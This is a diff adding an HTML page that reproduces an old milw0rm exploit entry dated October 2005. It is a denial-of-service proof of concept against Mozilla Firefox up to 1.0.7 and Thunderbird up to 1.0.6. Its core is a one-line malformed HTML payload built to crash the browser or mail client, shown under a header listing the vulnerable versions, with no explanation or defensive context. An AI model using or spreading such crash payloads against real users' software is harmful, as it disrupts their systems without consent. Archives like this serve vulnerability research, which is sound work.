@@ -1,0 +1,11 @@
+<html><head><title>Mozilla (Firefox <= 1.0.7) (Thunderbird <= 1.0.6) Denial of Service Exploit</title></head><pre>&lt;!--
+posidron@tripbit.net
+
+Vulnerable: Mozilla Firefox &lt;= 1.0.7
+            Mozilla Thunderbird  &lt;= 1.0.6
+
+--&gt;
+
+&lt;html&gt;&lt;body&gt;&lt;strong&gt;Mozilla&lt;sourcetext&gt;&lt;/body&gt;&lt;/html&gt;
+
+# milw0rm.com [2005-10-16]</pre></html>
